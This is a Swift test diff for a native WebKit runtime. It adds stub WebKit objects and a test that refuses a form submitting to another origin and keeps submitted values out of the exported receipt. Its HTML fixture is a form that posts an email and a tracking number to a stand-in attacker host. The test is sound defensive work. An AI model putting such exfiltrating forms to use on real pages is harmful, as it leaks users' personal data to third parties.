@@ -93,6 +93,78 @@ final class FormFixtureServer: @unchecked Sendable {
   }
 }
 
+/// WebKit's own submission and navigation objects, stood in for. Every property the
+/// runtime reads is overridden, so no uninitialised WebKit internal is ever read — but
+/// `-[WKFrameInfo dealloc]` and its siblings do read one, and trap on a null `CFRetain`
+/// when a Swift subclass is released. A stub going out of scope would therefore kill the
+/// bundle instead of failing a test, so every stub is kept for the life of the process.
+/// They exist because macOS 27 declares
+/// `webView(_:willSubmitForm:submissionHandler:)` and this build never calls it, and the
+/// receipt and the refusal have to be tested on something.
+private enum StubLifetime {
+  nonisolated(unsafe) static var retained: [AnyObject] = []
+
+  static func keep(_ value: AnyObject) { retained.append(value) }
+}
+
+private final class StubFrameInfo: WKFrameInfo {
+  static let mainFrame: StubFrameInfo = {
+    let frame = StubFrameInfo(isMainFrame: true)
+    StubLifetime.keep(frame)
+    return frame
+  }()
+
+  private let stubIsMainFrame: Bool
+
+  private init(isMainFrame: Bool) {
+    stubIsMainFrame = isMainFrame
+    super.init()
+  }
+
+  override var isMainFrame: Bool { stubIsMainFrame }
+}
+
+@available(macOS 27, *)
+private final class StubFormInfo: WKFormInfo {
+  private let stubSubmissionURL: URL
+  private let stubHTTPMethod: String
+  private let stubFormValues: [String: String]
+
+  init(submissionURL: URL, httpMethod: String, formValues: [String: String]) {
+    stubSubmissionURL = submissionURL
+    stubHTTPMethod = httpMethod
+    stubFormValues = formValues
+    super.init()
+    StubLifetime.keep(self)
+  }
+
+  override var submissionURL: URL { stubSubmissionURL }
+  override var httpMethod: String { stubHTTPMethod }
+  override var formValues: [String: String] { stubFormValues }
+  override var sourceFrame: WKFrameInfo { StubFrameInfo.mainFrame }
+  override var targetFrame: WKFrameInfo { StubFrameInfo.mainFrame }
+}
+
+private final class StubNavigationAction: WKNavigationAction {
+  private let stubRequest: URLRequest
+  private let stubNavigationType: WKNavigationType
+
+  init(url: URL, httpMethod: String, navigationType: WKNavigationType) {
+    var request = URLRequest(url: url)
+    request.httpMethod = httpMethod
+    stubRequest = request
+    stubNavigationType = navigationType
+    super.init()
+    StubLifetime.keep(self)
+  }
+
+  override var request: URLRequest { stubRequest }
+  override var navigationType: WKNavigationType { stubNavigationType }
+  override var sourceFrame: WKFrameInfo { StubFrameInfo.mainFrame }
+  override var targetFrame: WKFrameInfo? { StubFrameInfo.mainFrame }
+  override var shouldPerformDownload: Bool { false }
+}
+
 @Suite("Native WebKit runtime", .serialized)
 @MainActor
 struct WebKitRuntimeTests {
@@ -2195,6 +2267,72 @@ struct WebKitRuntimeTests {
 
     #expect(runtime.webView.url?.path == "/submitted")
     #expect(runtime.formSubmissionAuditEvents().isEmpty)
+  }
+
+  @available(macOS 27, *)
+  @Test("A form that submits to another origin is refused, and its field names are kept")
+  func foreignFormSubmissionIsRefused() async throws {
+    // WebKit's own account of what is being sent, which the page cannot author. Only
+    // classic form submissions reach this hook: a single-page application that
+    // intercepts submit and posts with fetch does not, and this must never be described
+    // as covering that.
+    //
+    // This beta build never delivers the callback. A real form, natively clicked with a
+    // trusted gesture, reaches its destination with the delegate not called once, which
+    // reproduces the negative measurement in
+    // docs/research/2026-08-22-will-submit-form-notebooklm.md on a newer build and is
+    // what `formSubmissionAudit` above asserts for the scripted path. So the delegate is
+    // invoked directly here, with WebKit's own objects stood in for, and the two things
+    // that must be right are tested rather than assumed: the receipt carries no value,
+    // and the refusal lands in the navigation policy handler.
+    let runtime = WebKitRuntime()
+    _ = try await runtime.loadHTML(
+      """
+      <form action="https://attacker.example/collect" method="post">
+        <input name="tracking" value="1471">
+        <input name="email" value="someone@example.test">
+        <button type="submit">Show tracking number</button>
+      </form>
+      """,
+      baseURL: URL(string: "https://shop.example/orders/1471"),
+      timeout: fixtureNavigationTimeout, quietWindow: .milliseconds(40))
+
+    let submissionURL = try #require(URL(string: "https://attacker.example/collect"))
+    var continued = false
+    runtime.webView(
+      runtime.webView,
+      willSubmitForm: StubFormInfo(
+        submissionURL: submissionURL,
+        httpMethod: "post",
+        formValues: ["tracking": "1471", "email": "someone@example.test"]),
+      submissionHandler: { continued = true })
+    // submissionHandler carries no decision. Withholding it would only hang the page.
+    #expect(continued)
+
+    let facts = try #require(runtime.latestSubmissionFacts())
+    #expect(facts.origin == "https://attacker.example")
+    #expect(facts.httpMethod.uppercased() == "POST")
+    #expect(facts.fieldCount == 2)
+    #expect(facts.fieldNames == ["email", "tracking"])
+    // The receipt is exported. A value in it is a leaked secret.
+    let encoded = String(
+      decoding: try JSONEncoder().encode(facts), as: UTF8.self)
+    #expect(!encoded.contains("someone@example.test"))
+    #expect(!encoded.contains("1471"))
+
+    // The refusal happens where every other refusal in this runtime happens.
+    let policy = await runtime.webView(
+      runtime.webView,
+      decidePolicyFor: StubNavigationAction(
+        url: submissionURL, httpMethod: "POST", navigationType: .formSubmitted))
+    #expect(policy == .cancel)
+    // Consumed once. A decision nothing acted on must not cancel the next navigation.
+    let afterConsumption = await runtime.webView(
+      runtime.webView,
+      decidePolicyFor: StubNavigationAction(
+        url: try #require(URL(string: "https://shop.example/orders/1471")),
+        httpMethod: "GET", navigationType: .other))
+    #expect(afterConsumption == .allow)
   }
 
   @Test("A forced real WebContent crash invalidates addresses and reloads without replay")
